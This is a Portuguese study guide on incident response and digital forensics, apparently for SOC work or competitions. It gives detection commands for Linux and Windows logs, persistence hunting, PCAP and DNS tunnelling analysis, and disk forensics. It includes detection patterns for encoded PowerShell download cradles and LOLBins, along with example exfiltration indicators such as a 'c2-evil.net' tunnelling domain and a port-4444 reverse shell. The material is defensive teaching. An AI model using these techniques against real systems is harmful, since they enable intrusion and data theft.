• Forense Post-Mortem (Dead Box): análise profunda sobre imagem bit-a-bit do disco e dump de memória em estação isolada, recuperando arquivos deletados e linha do tempo completa.
Persistência & LOLBins — como invasores sobrevivem e se camuflam. ⓘ detalhes
Persistência é o mecanismo deixado para manter acesso após reboot ou troca de senha (cron jobs, chaves SSH, serviços, tarefas agendadas, chaves Run no Registro).

Living-off-the-Land (LOLBins / GTFOBins): uso de ferramentas nativas e assinadas do próprio SO (powershell, certutil, curl, python, tar) para executar ações maliciosas sem gravar antivírus tradicional — por isso auditar argumentos de linha de comando é essencial.
C2, Beaconing & Exfiltração — sinais do invasor no tráfego de rede. ⓘ detalhes
• C2 (Command & Control): servidor externo usado pelo invasor para comandar o host infectado.
• Beaconing: conexões periódicas regulares (ex.: a cada 60s com pequeno jitter) do host interno para o C2 perguntando se há novas tarefas.
• Exfiltração: retirada de dados sensíveis por HTTP POST, upload em nuvem, SFTP ou camuflada em consultas DNS (DNS Tunneling).
Timeline & UTC — reconstruir a história exata do incidente. ⓘ detalhes
Em um incidente envolvendo firewall, servidor Linux, estação Windows e SIEM, cada equipamento pode estar em um fuso horário diferente.

Regra profissional: converta e registre todos os eventos em UTC (ISO 8601) na linha do tempo mestre, cobrindo: Paciente Zero / Acesso Inicial → Execução → Persistência → Movimento Lateral → Exfiltração → Contenção.
TP / FP / TN / FN — precisão na triagem de alertas do SOC. ⓘ detalhes
• Verdadeiro Positivo (TP): alerta disparou e realmente há atividade maliciosa.
• Falso Positivo (FP): alerta disparou para uma ação legítima (ex.: script de admin).
• Falso Negativo (FN): o mais perigoso — ataque ocorreu e nenhum alerta disparou (exige Threat Hunting proativo!).
• Verdadeiro Negativo (TN): tráfego normal sem alerta.
Contenção Cirúrgica — parar o sangramento preservando provas. ⓘ detalhes
Conter é impedir que o ataque se espalhe ou exfiltre mais dados. Divida em:
• Curto prazo: isolar a VLAN/host no firewall/EDR, bloquear IP de C2 no perímetro, suspender conta comprometida (usermod -L / Disable-ADAccount).
• Longo prazo / Erradicação: coletar evidências + hashes primeiro, depois remover persistência, corrigir a vulnerabilidade de entrada e restaurar de backup limpo se necessário.
Pirâmide da Dor — qual indicador custa mais caro para o atacante trocar. ⓘ detalhes
Criada por David Bianco, classifica indicadores do mais fácil ao mais difícil para o adversário alterar:
1. Valores de Hash (trivial mudar 1 byte)
2. Endereços IP (fácil trocar VPS/proxy)
3. Nomes de Domínio
4. Artefatos de Rede/Host (User-Agent, caminhos)
5. Ferramentas
6. TTPs (Táticas, Técnicas e Procedimentos) — detectar o comportamento obriga o invasor a reinventar todo o método!
SIEM, EDR, NDR & Métricas — arquitetura moderna de detecção. ⓘ detalhes
• SIEM (Splunk, Elastic, Wazuh): centraliza e correlaciona logs de toda a empresa.
• EDR: visibilidade profunda e isolamento em endpoints (processos, memória).
• NDR / IDS (Zeek, Suricata): visibilidade no tráfego de rede.
• MTTD / MTTR: Mean Time to Detect (tempo médio para detectar) e Mean Time to Respond (tempo médio para conter/recuperar) — principais indicadores de maturidade de um SOC.

NIST 800-61Computer Security Incident Handling Guideⓘ

Referência mundial para ciclo de vida de resposta a incidentes e integração ao CSF 2.0.

Na versão clássica (Rev. 2), define 4 fases: 1. Preparação → 2. Detecção e Análise → 3. Contenção, Erradicação e Recuperação → 4. Atividade Pós-Incidente.

Na Rev. 3, alinha-se continuamente ao NIST CSF 2.0 (Govern, Identify, Protect, Detect, Respond, Recover), enfatizando que as lições aprendidas devem retroalimentar imediatamente regras de SIEM, playbooks e controles de hardening.
PICERLMetodologia de 6 Fases da SANSⓘ

Divide operacionalmente contenção, erradicação e recuperação em etapas distintas.

As 6 etapas do PICERL:
1. Preparation (ferramentas, logs, playbooks)
2. Identification (triagem, escopo, paciente zero)
3. Containment (isolar sem destruir provas)
4. Eradication (remover persistência e corrigir causa-raiz)
5. Recovery (retomar produção com monitoramento reforçado)
6. Lessons Learned (relatório final e melhoria contínua).
ISO 27037& RFC 3227 — Evidências Digitaisⓘ

Normas para identificação, coleta, aquisição e preservação forense.

A RFC 3227 estabelece a ordem de volatilidade e boas práticas de coleta ao vivo, enquanto a ISO/IEC 27037 padroniza internacionalmente o manuseio de evidências digitais (auditabilidade, repetibilidade e justificativa técnica caso a coleta ao vivo altere parte do estado da memória).
ATT&CK& Cyber Kill Chain na Investigaçãoⓘ

Mapear cada evidência encontrada à tática e técnica usada pelo invasor.

Em relatórios de resposta a incidentes de alto nível (e provas WorldSkills), cada achado é classificado pela tática/técnica do MITRE ATT&CK — por exemplo: Força Bruta (T1110), Agendamento via Cron (T1053.003), PowerShell (T1059.001) ou Exfiltração sobre C2 (T1041).
YARAPattern Matching para Forense & Threat Huntingⓘ

O "canivete suíço" para identificar arquivos e processos maliciosos por padrões.

YARA permite escrever regras baseadas em cadeias de texto, sequências hexadecimais e condições lógicas (ex.: tamanho do arquivo, cabeçalho ELF/MZ + strings de C2) para varrer discos e dumps de memória RAM localizando webshells e malwares da mesma família.
SIGMAGeneric Signature Format for SIEM Systemsⓘ

O equivalente ao YARA/Snort, mas feito para logs de qualquer SIEM.

Uma regra Sigma é escrita em YAML descrevendo o evento malicioso (ex.: EventID: 4688 com CommandLine contendo -enc) e pode ser convertida automaticamente para consultas Splunk SPL, Elastic KQL ou Wazuh.

LOGSLogs de autenticação: força bruta, conta invadida e uso de sudo

/var/log/auth.log (Debian/Ubuntu) · /var/log/secure (RHEL/CentOS) · journalctl
›
O que é / o que procurar

Toda tentativa de login SSH, troca de usuário (su), comando com sudo e criação de conta (useradd) fica registrada nos logs de autenticação. Em um incidente, procure o padrão clássico: centenas de Failed password de um mesmo IP seguidas de um Accepted password (ou Accepted publickey) — esse é o exato segundo em que o atacante entrou.

Como investigar
# Ranking de IPs que mais falharam senha no SSH:
grep "Failed password" /var/log/auth.log /var/log/secure 2>/dev/null | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head

# Ver exatamente quem conseguiu logar e de qual IP:
grep -E "Accepted (password|publickey)" /var/log/auth.log /var/log/secure 2>/dev/null

# Auditar comandos sudo e criação de contas backdoor:
grep -E "sudo:|useradd|usermod" /var/log/auth.log /var/log/secure 2>/dev/null
🟢 Estado normalLogins apenas de IPs de gerência conhecidos, em horário esperado, sem rajadas de falhas prévias.
🔴 Indicador de invasão450 Failed password de IP externo seguidos de Accepted password for deploy + useradd logo depois.

SESSÕESRegistros binários de sessão (last, lastb, lastlog e w)

/var/log/wtmp · /var/log/btmp · /var/log/lastlog
›
O que é / por que importa

Mesmo quando um invasor edita logs em texto puro, muitas vezes esquece dos arquivos binários de sessão: wtmp (lido por last), btmp (tentativas falhas, lido por lastb) e lastlog. Se esses arquivos estiverem com tamanho zero ou truncados, isso por si só já prova adulteração intencional (Defense Evasion).

Como investigar
w                                # sessões interativas abertas neste exato momento
last -aiF | head -20             # logins bem-sucedidos com timestamps completos e IP
lastb -aiF | head -20            # falhas de autenticação registradas no btmp
lastlog | grep -v "Never"        # contas de sistema (ex.: www-data) que nunca deveriam ter login!
🟢 Estado normalApenas administradores humanos aparecem no lastlog; contas de serviço marcam **Never logged in**.
🔴 Indicador de invasãoConta de serviço (apache, postgres) com login recente ou sessão ativa de IP desconhecido em still logged in.

WEB LOGSInvestigação em logs de servidor Web (access.log e error.log)

detectar scanners, SQLi/LFI, upload malicioso e uso de webshell
›
O que é / o que procurar

Quando o vetor inicial é uma aplicação pública, toda a história da invasão fica em /var/log/httpd/ ou /var/log/nginx/. Procure: picos de erros 404/500 (reconhecimento/fuzzing), parâmetros suspeitos codificados em URL, um POST retornando 200/201 seguido de vários GET/POST para um arquivo novo em /uploads/ (sinal clássico de webshell!).

Como investigar
# Top IPs com maior volume de requisições:
awk '{print $1}' /var/log/httpd/access_log | sort | uniq -c | sort -nr | head

# Caçar acessos bem-sucedidos (HTTP 200) em pastas de upload ou arquivos suspeitos:
grep -E "(/uploads/|/tmp/|\.php\?)" /var/log/httpd/access_log | grep " 200 "

# Identificar User-Agents de ferramentas automatizadas (sqlmap, gobuster, curl, nikto):
awk -F'"' '{print $6}' /var/log/httpd/access_log | sort | uniq -c | sort -nr | head
🟢 Estado normalRequisições distribuídas para rotas previstas da aplicação, sem execução de scripts em pastas de mídia.
🔴 Indicador de invasãoPOST /upload.php 200 seguido de repetidos acessos 200 a /uploads/avatar.php pelo mesmo IP externo.

MEMÓRIA AO VIVOProcessos anômalos, binários apagados (/proc) e conexões C2

ps auxf · ss -tupn · lsof · /proc/<PID>/exe (deleted)
›
O que é / por que importa

Atacantes costumam executar um binário malicioso a partir de /tmp ou /dev/shm e apagá-lo em seguida para não aparecer no ls. Porém, enquanto o processo estiver rodando, o kernel mantém o executável acessível em /proc/<PID>/exe marcado como (deleted) — de onde o perito consegue copiá-lo e extrair o hash antes de encerrar o processo!

Como investigar
# Cruzar conexões externas ESTABLISHED com o PID/programa responsável:
ss -tupn | grep ESTAB

# Achar processos cujo binário foi deletado do disco (técnica clássica de evasão):
ls -la /proc/*/exe 2>/dev/null | grep "(deleted)"

# Recuperar o binário direto da memória ANTES de matar o processo:
cp /proc/<PID>/exe /root/evidencia_pid.bin && sha256sum /root/evidencia_pid.bin
🟢 Estado normalProcessos filhos coerentes (httpd não invoca bash) e conexões de saída apenas para serviços esperados.
🔴 Indicador de invasãoProcesso apache filho abrindo conexão ESTAB para porta externa alta ou /proc/4412/exe -> /dev/shm/.sync (deleted).

PERSISTÊNCIACaça a persistência no Linux (Cron, SSH keys, systemd e UID 0)

descobrir todas as portas dos fundos antes de devolver o servidor
›
O que é / por que importa

Se você apenas fechar a falha inicial sem varrer os pontos de persistência, o invasor volta minutos depois. Verifique sempre os 5 esconderijos preferidos no Linux: tarefas agendadas (cron), chaves públicas adicionadas em authorized_keys, unidades systemd recém-criadas, perfis de shell (.bashrc) e contas extras com UID 0 em /etc/passwd.

Como investigar
# 1) Varrer TODOS os diretórios de cron do sistema e de usuários:
cat /etc/crontab /etc/cron.d/* /var/spool/cron/* /var/spool/cron/crontabs/* 2>/dev/null

# 2) Conferir chaves SSH autorizadas em todas as contas (inclusive root):
head -n 20 /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null

# 3) Checar contas com UID 0 (além do root legítimo) e serviços systemd recentes:
awk -F: '($3 == 0) {print $1}' /etc/passwd
find /etc/systemd/system -maxdepth 2 -type f -mtime -7
🟢 Estado normalApenas root tem UID 0; chaves SSH e tarefas agendadas documentadas pela equipe.
🔴 Indicador de invasãoLinha oculta em /var/spool/cron/root conectando para fora a cada 5 minutos ou chave SSH desconhecida no root.

FILESYSTEMLinha do tempo de arquivos e detecção de Timestomping (find / stat)

mtime (conteúdo) vs. ctime (metadado/inode)
›
O que é / por que importa

Quando você descobre o horário da invasão nos logs, o próximo passo é listar todos os arquivos criados/alterados naquela janela. Atacantes avançados usam touch -r para falsificar a data de modificação (Modify / mtime) de uma backdoor igualando-a a arquivos antigos (Timestomping) — mas o kernel atualiza o Change / ctime com a data real em que o arquivo foi plantado!

Como investigar
# Listar arquivos com metadado/inode alterado nas últimas 24h (-ctime -1) em /var/www e /etc:
find /var/www /etc -type f -ctime -1 -ls 2>/dev/null

# Inspecionar os 4 timestamps de um arquivo suspeito (Access, Modify, Change, Birth):
stat /var/www/html/includes/helper.php
🟢 Estado normalModify e Change coerentes com a janela de deploy oficial da equipe.
🔴 Indicador de invasãoModify: 2023-01-10, mas Change: 2026-11-24 03:14:22 — prova clara de timestomping!

ARTEFATOSHistórico de comandos (.bash_history) e sinais de anti-forense

reconstruir ações interativas ou provar limpeza deliberada
›
O que é / por que importa

Arquivos de histórico (.bash_history, .zsh_history, .mysql_history, .viminfo) revelam passo a passo o que foi digitado. Se o atacante rodou unset HISTFILE ou criou um link simbólico .bash_history -> /dev/null, o link em si é um forte indicador forense de evasão.

Como investigar
# Verificar permissões/links simbólicos e ler históricos de todas as contas:
ls -la /root/.*history /home/*/.*history 2>/dev/null
tail -n 40 /root/.bash_history /home/*/.bash_history 2>/dev/null
🟢 Estado normalArquivo regular -rw------- contendo apenas rotina administrativa conhecida.
🔴 Indicador de invasãoComandos de download/compactação de dados em /tmp ou link .bash_history -> /dev/null.

AUDITDReconstrução pelo kernel com ausearch e aureport

/var/log/audit/audit.log · rastreia EXECVE e alterações críticas
›
O que é / por que importa

Mesmo que o invasor não deixe histórico no bash, o subsistema de auditoria do kernel (auditd) registra chamadas de execução (EXECVE), logins e toques em arquivos vigiados com o auid (Audit UID original) — revelando qual usuário real entrou antes de virar root!

Como investigar
# Resumo geral de eventos de autenticação, falhas e executáveis:
aureport --summary
aureport -x --summary | tail -15              # binários executados

# Buscar eventos por chave configurada (-k) com tradução legível (-i):
ausearch -k identity_changes -i
ausearch -m EXECVE -ts today -i | tail -30
🟢 Estado normalAlterações em arquivos sensíveis associadas apenas a janelas de manutenção autorizadas.
🔴 Indicador de invasãoRegistro SYSCALL/EXECVE mostrando auid=1002(deploy) uid=0(root) editando /etc/sudoers na madrugada.

CONTENÇÃOContenção e erradicação cirúrgica no Linux (sem perder evidências)

preservar hash → bloquear C2 → travar conta → encerrar processo → limpar persistência
›
O que é / ordem correta

Na pressa, apagar o binário malicioso antes de copiá-lo e tirar o hash destrói o IOC que o SOC precisa para varrer o resto da empresa. Siga sempre a sequência disciplinada: 1º Preservar evidência + SHA-256 → 2º Bloquear IP do C2/atacante no firewall → 3º Travar conta comprometida → 4º Encerrar processo malicioso e limpar persistência.

Como executar
# 1) Copiar artefato para cofre de evidências e registrar hash SHA-256:
mkdir -p /root/ir_case && cp -p /tmp/.beacon /root/ir_case/ && sha256sum /root/ir_case/.beacon > /root/ir_case/hashes.txt

# 2) Bloquear comunicação com o IP do atacante/C2 no firewall:
firewall-cmd --add-rich-rule='rule family="ipv4" source address="198.51.100.44" drop' --permanent && firewall-cmd --reload

# 3) Bloquear conta comprometida, encerrar processos do invasor e remover artefato/cron:
usermod -L conta_invadida
kill -9 <PID_MALICIOSO> && rm -f /tmp/.beacon
🔴 Erro comumRodar rm -rf /tmp/* e reboot de imediato — perde RAM, conexões e hash do malware.
🟢 Resposta corretaAmostra e hash salvos, IP bloqueado no firewall, conta travada, persistência limpa e serviço legítimo no ar.

EVENT LOGInvestigação de Logons e Força Bruta (Event IDs 4624, 4625 e Logon Types)

Security.evtx · diferenciar logon local (2), SMB/rede (3) e RDP (10)
›
O que é / o que procurar

No log Security, uma sequência de 4625 seguida de 4624 (e 4672 logo depois) indica comprometimento de credencial com privilégio administrativo. Observe sempre o campo Logon Type: Type 2 (console local), Type 3 (rede/SMB/WinRM — movimento lateral!), Type 5 (serviço) e Type 10 (acesso remoto gráfico RDP).

Como investigar (PowerShell)
# Contar falhas de logon (4625) recentes:
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 | select TimeCreated,Message

# Filtrar logons bem-sucedidos (4624) remotos (Type 3 ou Type 10):
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 30 |
  Where-Object { $_.Message -match 'Logon Type:\s+(3|10)' } | select TimeCreated,Id,Message
🟢 Estado normalLogons de estações internas conhecidas, sem picos de erro 4625 nem RDP fora de horário.
🔴 Indicador de invasãoDezenas de 4625 seguidos de 4624 (Logon Type 10) na conta Administrador vindo de IP inesperado.

EVENT LOGContas Backdoor, Escalonamento de Grupo e Log Apagado (4720, 4732, 1102)

detectar criação de admin oculto e tentativa de apagar rastros
›
O que é / por que importa

Após conseguir acesso inicial, invasores costumam criar uma conta local/domínio reserva (4720), colocá-la em Administrators (4732) ou Domain Admins (4728) e limpar o Event Viewer. Quando apagam o log Security, o próprio Windows grava imediatamente o Event ID 1102 (The audit log was cleared) com o usuário responsável!

Como investigar
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720,4728,4732,1102} -ErrorAction SilentlyContinue |
  select TimeCreated,Id,Message
🟢 Estado normalZero ocorrências de 1102; criações de conta (4720) vinculadas a chamados formais de RH/TI.
🔴 Indicador de invasãoEvento 4720 criando conta svc_support$ + 4732 em Administrators ou presença de 1102.

EXECUÇÃOProcessos e PowerShell Ofuscado (Event ID 4688 e 4104)

Microsoft-Windows-PowerShell/Operational · decodificar Base64 com segurança
›
O que é / por que importa

Atacantes em Windows abusam intensamente de powershell.exe -nop -w hidden -enc <Base64> e LOLBins (certutil -urlcache, rundll32, mshta). Mesmo que a linha de comando esteja codificada no evento 4688, o Script Block Logging (Event ID 4104) registra o bloco de código já desdobrado pelo motor do PowerShell!

Como investigar
# Inspecionar blocos de script suspeitos registrados no log operacional do PowerShell:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 25 |
  Where-Object { $_.Message -match 'DownloadString|Invoke-|FromBase64String|Net\.WebClient' } | select TimeCreated,Message

# Decodificar string -EncodedCommand (UTF-16LE) APENAS como texto (nunca use Invoke-Expression!):
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("<STRING_BASE64>"))
🟢 Estado normalScripts administrativos internos conhecidos e assinados.
🔴 Indicador de invasãoEvento 4104 baixando script externo de IP desconhecido ou gravando persistência em C:\ProgramData\.

SYSMONTelemetria avançada com Sysmon (IDs 1, 3, 11 e 22)

hashes de processo, conexões de rede por .exe e consultas DNS
›
O que é / por que importa

O Sysmon entrega num único canal o que o log padrão do Windows não mostra: ID 1 (processo criado já com ParentImage + hash SHA-256), ID 3 (qual executável abriu conexão TCP para qual IP), ID 11 (arquivo criado em disco) e ID 22 (qual processo consultou qual domínio DNS).

Como investigar
# Listar conexões de rede iniciadas por processos (Sysmon ID 3) e consultas DNS (ID 22):
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1,3,22} -MaxEvents 30 |
  select TimeCreated,Id,Message
🟢 Estado normalNavegadores e agentes corporativos conectando em domínios esperados.
🔴 Indicador de invasãoSysmon ID 1: w3wp.exe (IIS) gerando cmd.exe / powershell.exe + ID 3 conectando a IP externo.

PERSISTÊNCIACaça a persistência no Windows (Serviços 7045, Tarefas 4698 e Chaves Run)

Registry Run/RunOnce · Scheduled Tasks · Services em pastas temporárias
›
O que é / o que procurar

Binários legítimos do Windows residem em C:\Windows\System32 ou C:\Program Files. Qualquer chave de inicialização (Run), Tarefa Agendada ou Serviço apontando para C:\Users\Public, C:\ProgramData, AppData\Local\Temp ou chamando powershell/cmd é altíssimo indício de persistência maliciosa.

Como investigar
# 1) Novos serviços instalados no log System (Event ID 7045):
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -ErrorAction SilentlyContinue | select TimeCreated,Message

# 2) Chaves de Registro Run / RunOnce (HKLM e HKCU):
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run","HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# 3) Tarefas agendadas fora do namespace padrão da Microsoft:
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft\*" } | select TaskName,TaskPath,State
🟢 Estado normalApenas agentes oficiais assinados pela empresa/fabricante nas chaves e serviços.
🔴 Indicador de invasãoEvento 7045 registrando serviço WinUpdaterSvc apontando para C:\ProgramData\upd.exe.

ARTEFATOSConexões ativas, Assinatura Digital e Artefatos de Disco (Prefetch / MFT)

Get-NetTCPConnection · Authenticode · Prefetch prova execução passada
›
O que é / por que importa

Em triagem ao vivo, cruze conexões Established com o caminho e a assinatura digital do processo. Já em forense de disco, mesmo que o invasor apague o .exe, o arquivo C:\Windows\Prefetch\NOME.EXE-HASH.pf (e o Amcache / $MFT) prova que aquele binário existiu, quantas vezes rodou e o horário da última execução!

Como investigar
# Ligar conexão externa ativa ao processo e validar assinatura digital:
Get-NetTCPConnection -State Established | select LocalPort,RemoteAddress,RemotePort,OwningProcess
Get-Process -Id <PID> | select Id,ProcessName,Path
Get-AuthenticodeSignature "C:\ProgramData\upd.exe"

# Verificar artefatos Prefetch recentes (prova de execução mesmo após exclusão):
Get-ChildItem C:\Windows\Prefetch\*.pf | Sort-Object LastWriteTime -Descending | select -First 10 Name,LastWriteTime
🟢 Estado normalStatus: Valid na assinatura Authenticode e sem executáveis desconhecidos no Prefetch.
🔴 Indicador de invasãoStatus: NotSigned em executável conectado para fora ou rastro MIMIKATZ.EXE-*.pf no Prefetch.

CONTENÇÃOContenção e erradicação segura no Windows

Get-FileHash → Firewall Block → Disable-LocalUser/ADAccount → parar serviço/tarefa
›
O que é / ordem correta

Colete primeiro o hash SHA-256 do artefato suspeito e exporte os logs relevantes (wevtutil epl), depois corte a comunicação com o C2 via Firewall, desative contas comprometidas/backdoor e remova o serviço ou tarefa agendada persistente.

Como executar (PowerShell)
# 1) Registrar hash SHA-256 e copiar evidência:
Get-FileHash "C:\ProgramData\upd.exe" -Algorithm SHA256

# 2) Bloquear IP do C2 na saída/entrada do Windows Firewall:
New-NetFirewallRule -DisplayName "IR Block C2" -Direction Outbound -RemoteAddress 203.0.113.77 -Action Block

# 3) Desabilitar conta backdoor e parar/remover serviço malicioso:
Disable-LocalUser -Name "svc_support$"
Stop-Service -Name "WinUpdaterSvc" -Force; sc.exe delete "WinUpdaterSvc"
🔴 Erro comumFormatar ou apagar o arquivo sem anotar o hash SHA-256 nem bloquear o IP do C2 para os demais hosts.
🟢 Resposta corretaHash documentado, tráfego C2 bloqueado, conta desativada e persistência erradicada.

PCAPTriagem rápida de capturas com Wireshark e tshark

achar rapidamente os IPs envolvidos, protocolos e maiores fluxos
›
O que é / por que importa

Um arquivo .pcap pode ter centenas de milhares de pacotes — rolar pacote por pacote faz perder tempo precioso. Comece sempre pelo resumo de conversas IP e hierarquia de protocolos para enxergar imediatamente quem falou com quem, por quanto tempo e qual o volume transferido.

Como investigar
# Resumo das conversas IP e da hierarquia de protocolos via terminal (tshark):
tshark -r captura.pcap -q -z conv,ip
tshark -r captura.pcap -q -z io,phs

# Filtros essenciais de exibição no Wireshark:
ip.addr == 198.51.100.44                      # isolar tudo de/para um IP suspeito
http.request or tls.handshake.type == 1       # ver requisições HTTP e SNI de conexões TLS
🟢 Estado normalConversas concentradas entre clientes e servidores previstos em portas padrão.
🔴 Indicador de invasãoConversa longa ou volumosa entre servidor interno e IP externo desconhecido em porta incomum (ex.: 4444, 8443).

PCAPDetecção de Port Scan (Nmap) e Brute Force em capturas

tcp.flags.syn==1 and tcp.flags.ack==0 · identificar paciente zero e timestamp
›
O que é / o que procurar

Uma varredura TCP SYN dispara milhares de pacotes SYN para portas distintas em poucos segundos, recebendo RST,ACK das fechadas e SYN,ACK apenas das abertas. Logo após descobrir as portas abertas, o mesmo IP costuma iniciar o ataque contra o serviço encontrado.

Como investigar
# Contar quem mais disparou pacotes SYN iniciais (identifica o scanner na hora):
tshark -r captura.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src | sort | uniq -c | sort -nr

# Ver quais portas do servidor realmente responderam SYN,ACK (portas abertas descobertas):
tshark -r captura.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==1" -T fields -e tcp.srcport | sort -u
🟢 Estado normalPoucos pacotes SYN seguidos de handshake completo (SYN → SYN,ACK → ACK) em portas de serviço.
🔴 Indicador de invasão1.000+ pacotes SYN vindos de um único IP em segundos varrendo portas 1–1024.

PCAPReconstrução de Fluxo HTTP e extração de arquivos transferidos

Follow HTTP Stream · Export Objects → calcular hash SHA-256
›
O que é / por que importa

Em tráfego não cifrado (HTTP, FTP, SMB legado), é possível reconstruir exatamente os comandos enviados a uma webshell e extrair o arquivo binário ou documento exfiltrado diretamente do PCAP para calcular seu hash SHA-256 (questão clássica de provas práticas!).

Como investigar
# Listar todas as URLs e métodos HTTP da captura:
tshark -r captura.pcap -Y "http.request" -T fields -e frame.time -e ip.src -e http.request.method -e http.request.full_uri

# Exportar todos os objetos HTTP via linha de comando para uma pasta e tirar o hash:
tshark -r captura.pcap --export-objects http,./objetos_extraidos/
sha256sum ./objetos_extraidos/*
# (No Wireshark gráfico: File > Export Objects > HTTP)
🟢 Estado normalObjetos estáticos legítimos da página (CSS, imagens, páginas públicas).
🔴 Indicador de invasãoDownload de script/binário de segundo estágio ou upload de arquivo confidencial compactado.

DNS / EXFILInvestigação de DNS: domínios de C2 e DNS Tunneling

detectar dados exfiltrados escondidos em subdomínios Hex / Base64
›
O que é / como funciona

Como muitos firewalls bloqueiam portas diretas mas deixam consultas DNS (UDP 53) passarem, invasores quebram um arquivo roubado em pedaços codificados (Hex ou Base64) e fazem consultas do tipo 436f6e666964656e6369616c.c2-evil.net. O servidor DNS autoritativo do atacante recebe as consultas e remonta o arquivo!

Como investigar
# Extrair todas as consultas DNS do PCAP para encontrar domínios anômalos ou subdomínios longos:
tshark -r captura.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u

# Reconstruir dados em Hex extraídos dos subdomínios (sem duplicatas):
tshark -r captura.pcap -Y "dns.flags.response==0 && dns.qry.name contains c2-evil.net" -T fields -e dns.qry.name |
  cut -d. -f1 | tr -d '\n' | xxd -r -p
🟢 Estado normalConsultas curtas e legíveis para domínios corporativos e CDNs conhecidas.
🔴 Indicador de invasãoCentenas de consultas sequenciais TXT/A com subdomínios longos em Hex/Base64 para um mesmo domínio externo.

C2 / IDSDetecção de Beaconing C2, Exfiltração e alertas Suricata (eve.json)

intervalos regulares · bytes_out alto · correlação com IDS
›
O que é / por que importa

Mesmo quando o C2 usa HTTPS (conteúdo cifrado), os metadados entregam o ataque: certificado TLS autoassinado/recente, SNI suspeito, conexões em intervalo fixo (ex.: a cada 30s durante horas — beaconing) ou megabytes enviados para fora (bytes_toserver muito maior que o normal). Cruze sempre com /var/log/suricata/eve.json.

Como investigar
# Filtrar alertas de alta severidade no eve.json do Suricata com jq:
jq 'select(.event_type=="alert") | {time:.timestamp, src:.src_ip, dst:.dest_ip, sig:.alert.signature}' /var/log/suricata/eve.json

# Listar SNI (nomes de domínio em conexões HTTPS) em um PCAP:
tshark -r captura.pcap -Y "tls.handshake.extensions_server_name" -T fields -e ip.src -e tls.handshake.extensions_server_name | sort -u
🟢 Estado normalServidores internos fazem muito mais download (updates) ou resposta a clientes do que upload espontâneo externo.
🔴 Indicador de invasãoServidor de banco/arquivos abrindo conexões periódicas HTTPS para domínio recém-registrado e enviando 250 MB.

PERÍMETROCorrelação de logs de Firewall e Proxy

diferenciar tentativa bloqueada (ruído externo) de conexão aceita (incidente!)
›
O que é / por que importa

Todo firewall conectado à internet recebe milhares de tentativas bloqueadas por minuto. Como investigar
# Filtrar conexões PERMITIDAS envolvendo um IP suspeito ou saídas da DMZ:
grep "198.51.100.44" /var/log/firewall.log | grep -i "pass\|accept"

🔴 Comprometimento ativoConexão PASS de saída do servidor interno para a porta 4444 do IP externo (shell reverso!).

Em SOCs e competições modernas, os logs de todas as máquinas já estão indexados em um SIEM (Splunk ou Elastic/Kibana). Saber escrever consultas em SPL (Splunk) e KQL (Kibana) permite correlacionar em segundos onde um invasor logou, quais processos disparou e para quais outros hosts se moveu lateralmente.

PHISHINGAnálise forense de e-mail malicioso (Cabeçalhos, SPF/DKIM/DMARC e Anexos)

identificar spoofing · extrair IP real de envio, URLs e hash do anexo
›
O que é / como analisar

O phishing é um dos principais vetores de acesso inicial (MITRE T1566). O campo From: exibido ao usuário é facilmente falsificado! Para descobrir a origem real, leia os cabeçalhos Received: de baixo para cima, compare From vs. Return-Path / Reply-To, cheque Authentication-Results (spf=fail, dkim=fail, dmarc=fail) e extraia URLs e o SHA-256 de anexos sem abri-los.

Como investigar
# Extrair campos críticos de um arquivo .eml bruto com segurança:
grep -Ei "^(From|Reply-To|Return-Path|Subject|Received|Authentication-Results):" suspeito.eml

# Extrair URLs embutidas no corpo sem clicar:
grep -Eo 'https?://[^">\s]+' suspeito.eml | sort -u

CUSTÓDIAAquisição bit-a-bit, montagem somente leitura e hash SHA-256

dd / dc3dd · sha256sum · mount -o ro,loop,noexec
›
O que é / por que importa

Montar uma imagem de disco sem a flag ro (read-only) faz o sistema operacional atualizar metadados de acesso, alterando o hash da evidência e invalidando a prova pericial! Gere o hash antes e depois da cópia e trabalhe exclusivamente sobre cópia ou montagem somente leitura.

Como executar
# 1) Calcular hash do original, gerar cópia forense e validar que os hashes batem:
sha256sum evidencia.img > evidencia.sha256
cp evidencia.img analise_copia.img && sha256sum -c evidencia.sha256

# 2) Montar partição de imagem SEMPRE em modo somente leitura e sem execução:
mount -o ro,loop,noexec,nodev analise_copia.img /mnt/forense
🔴 Contaminação forenseMontar a imagem original em leitura/escrita — o hash SHA-256 muda imediatamente.
🟢 Cadeia íntegraevidencia.img: OK no sha256sum -c e análise feita em cópia montada com ro,noexec.

DISCOForense de disco e recuperação de arquivos apagados (Sleuth Kit / Autopsy)

mmls (partições) · fls (listar deletados) · icat (extrair por inode)
›
O que é / como funciona

Quando alguém apaga um arquivo normalmente (rm / Lixeira), o sistema apenas marca o ponteiro (inode ou entrada MFT) como livre — os blocos de dados continuam no disco até serem sobrescritos! O Sleuth Kit (motor de linha de comando por trás do Autopsy) lista arquivos deletados com * e recupera seu conteúdo pelo número do inode.

Como investigar
# 1) Ver tabela de partições da imagem (anotar o offset inicial da partição):
mmls disco.img

# 2) Listar arquivos recursivamente, exibindo deletados (marcados com *):
fls -r -d -o <OFFSET> disco.img

# 3) Extrair o arquivo deletado diretamente pelo número do inode:
icat -o <OFFSET> disco.img <INODE> > recuperado.bin && sha256sum recuperado.bin
🟢 Sem artefato ocultoApenas arquivos temporários normais do sistema entre os inodes liberados.
🔴 Evidência recuperadar/r * 1842: segredos_clientes.zip ou script de exfiltração apagado mas íntegro via icat!

TRIAGEMAnálise estática segura de artefatos (file, strings, exiftool e sha256sum)

nunca execute um binário suspeito na sua máquina — inspecione estaticamente!
›
O que é / por que importa

